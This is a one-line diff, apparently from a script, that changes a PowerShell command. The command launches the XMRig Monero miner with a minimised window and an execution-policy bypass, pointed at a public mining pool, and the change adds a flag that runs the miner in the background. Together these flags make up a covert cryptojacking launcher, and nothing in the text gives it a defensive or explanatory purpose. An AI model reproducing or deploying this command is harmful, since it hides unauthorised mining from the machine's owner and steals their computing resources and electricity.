@@ -1,1 +1,1 @@
-powershell -W Minimised -Exec Bypass cmd.exe /c %xmrig% -a cryptonight --asm=auto --nicehash --opencl --cuda --cpu-memory-pool=-1 --donate-level=1 -o stratum+tcp://xmr.pool.minergate.com:45700 -u used@mediatui.com -p x
+powershell -W Minimised -Exec Bypass cmd.exe /c %xmrig% -a cryptonight --asm=auto --nicehash --opencl --cuda --cpu-memory-pool=-1 --donate-level=1 -B -o stratum+tcp://xmr.pool.minergate.com:45700 -u used@mediatui.com -p x
